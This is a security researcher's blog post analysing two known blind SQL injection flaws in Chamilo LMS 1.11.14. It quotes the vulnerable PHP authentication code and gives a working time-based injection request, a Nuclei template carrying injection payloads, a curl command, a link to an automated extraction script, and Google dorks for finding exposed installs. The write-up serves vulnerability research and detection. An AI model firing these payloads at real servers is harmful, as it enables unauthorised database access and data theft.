# :link: Medium

---

### Let’s get to the point!

>

However, I would like to clarify that these vulnerabilities had already been discovered by other researchers; the only remaining task was to automate their exploitation.

During a Red Team exercise, I encountered a system that required a thorough analysis to identify known vulnerabilities. My first step was to search for publicly available exploits, as this could save time during the exploitation phase. Fortunately, I found a YAML file indicating the presence of an SQL Injection vulnerability. However, the situation became more complex when I couldn’t find a publicly available exploit. This is a critical issue, as performing a Blind SQL Injection attack manually is neither efficient nor advisable, especially when time is a critical factor.

I opted for the fastest and most direct approach: I downloaded the CMS in question to conduct a detailed analysis of the vulnerability. The goal was to understand how the SQL query is constructed, thereby facilitating the creation of an effective payload. I began by identifying the function that handles the vulnerable parameter, called `options`, within the file `/main/inc/ajax/extra_field.ajax.php`. Subsequently, I traced the execution flow until the query is executed in `/main/inc/lib/extra_field.ajax.php`.

## Get Miguel Angel Méndez Z.’s stories in your inbox

Join Medium for free to get updates from this writer.

Remember me for faster sign in

At this point, I observed that the parameter was not being properly sanitized, in contrast to the later fix that added the `escape_string()` function to mitigate the vulnerability. This analysis allowed me to understand the sanitization failure and proceed with creating an effective exploit.

*Knowing the Vulenrability (White Box)*

In summary, I started developing a Python script aimed at automating the exploitation of the Blind SQL Injection vulnerability. This code not only allows for identifying whether a URL is vulnerable but also provides functionalities to determine the number of databases and tables present, retrieve the names of databases, tables, and columns, and ultimately extract records.

*Check SQL Injection*

*Getting names from databases*

>

[https://github.com/s1kr10s/Exploit-Scripts/blob/main/Chamilo-bSQLi.py](https://github.com/s1kr10s/Exploit-Scripts/blob/main/Chamilo-bSQLi.py)

As an additional finding, I encountered another Blind SQL Injection vulnerability that was surprisingly simple yet somewhat overlooked. This vulnerability manifests through an XML request, where the `$WSKey` parameter is not properly sanitized, while the `$WSUser` parameter is. This clearly opens the door to an easy and predictable exploitation.

```
$WSUser = $doc->getElementsByTagName('Username')->item(0)->nodeValue;
$WSKey = $doc->getElementsByTagName('Password')->item(0)->nodeValue;

$s = new WSSESoapServer($doc);
if (!empty($WSUser) && !empty($WSKey)) {
if (authenticate($WSUser, $WSKey)) { // SEND VULNERABLE PARAMETER -> $WSKey
...
}
}

function authenticate($WSUser, $WSKey)
{
$tUser = Database::get_main_table(TABLE_MAIN_USER);
$tApi = Database::get_main_table(TABLE_MAIN_USER_API_KEY);
$login = Database::escape_string($WSUser);
$sql = "SELECT u.user_id, u.status FROM $tUser u, $tApi a
WHERE
u.username='".$login."' AND
u.user_id = a.user_id AND
a.api_service = 'dokeos' AND
a.api_key='".$WSKey."'"; // SQL INJECTION HERE
$result = Database::query($sql);

...
}
```

Here is an example of a simple request that validates the existence of time-based SQL injection:

```
POST /plugin/sepe/ws/service.php HTTP/1.1
Host: hostname
User-Agent: Mozilla/5.0
Cache-Control: max-age=0
Content-Type: text/xml

<?xml version="1.0" encoding="UTF-8"?>
<root>
<Username>admin</Username>
<Password>admin' UNION ALL SELECT 1,sleep(10) -- </Password>
</root>
```

For this vulnerability, there was no existing Nuclei template to identify it quickly. In light of this situation, I decided to create a custom template, which I share below:

```
id: chamilo-sqli-webservices

info:
name: Chamilo 1.11.14 - SQL Injection
author: s1kr10s
severity: critical
description: Chamilo 1.1.14 contains a SQL injection vulnerability. There is a plugin with its own web service, which has the authentication vulnerable to SQL injection in the password parameter.
reference: https://infosecwriteups.com/chamilo-lms-1-11-14-analysis-of-two-blind-sql-injection-vulnerabilities-c04643fe637d
classification:
cvss-metrics: CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H
cvss-score: 10
cwe-id: CWE-89
metadata:
max-request: 1
tags: chamilo,sqli

requests:
- method: GET
path:
- "{{BaseURL}}/plugin/sepe/ws/service.php"

matchers-condition: and
matchers:
- type: status
status:
- 200
- type: word
words:
- "<?xml version=" # Verify that it is an XML file

stop-at-first-match: true

- method: POST
path:
- "{{BaseURL}}/plugin/sepe/ws/service.php"

headers:
Content-Type: text/xml

body: |
<?xml version="1.0" encoding="UTF-8"?>
<root>
<Username>admin</Username>
<Password>admin' UNION ALL SELECT '1','4</Password>
</root>

matchers:
- type: status
status:
- 500
- type: word
words:
- "error" # Or any other word that confirms that the injection was successful

# Add additional conditions to stop the flow if the first request fails
matchers-condition: and

# Using curl
# curl -i -s -k --location --request POST 'http://target.com/cursos/plugin/sepe/ws/service.php' \
#--header 'User-Agent: Mozilla/5.0' \
#--header 'Host: target.com' \
#--header 'Accept-Encoding: gzip, deflate, br' \
#--header 'Cache-Control: max-age=0' \
#--header 'Accept-Language: en-US;q=0.9,en;q=0.8' \
#--header 'Content-Length: 164' \
#--header 'Content-Type: application/x-www-form-urlencoded' \
#--data-raw '<?xml version="1.0" encoding="UTF-8"?>
# <root>
# <Username>admin</Username>
# <Password>admin' UNION ALL SELECT '1','4</Password>
# </root>'
```

### Some Google Dork

>

inurl:“/main/auth/lostPassword.php” site:*

inurl:“index.php?language=spanish” site:*

intext:“Powered by Chamilo” site:*

Bye, see you soon…

---
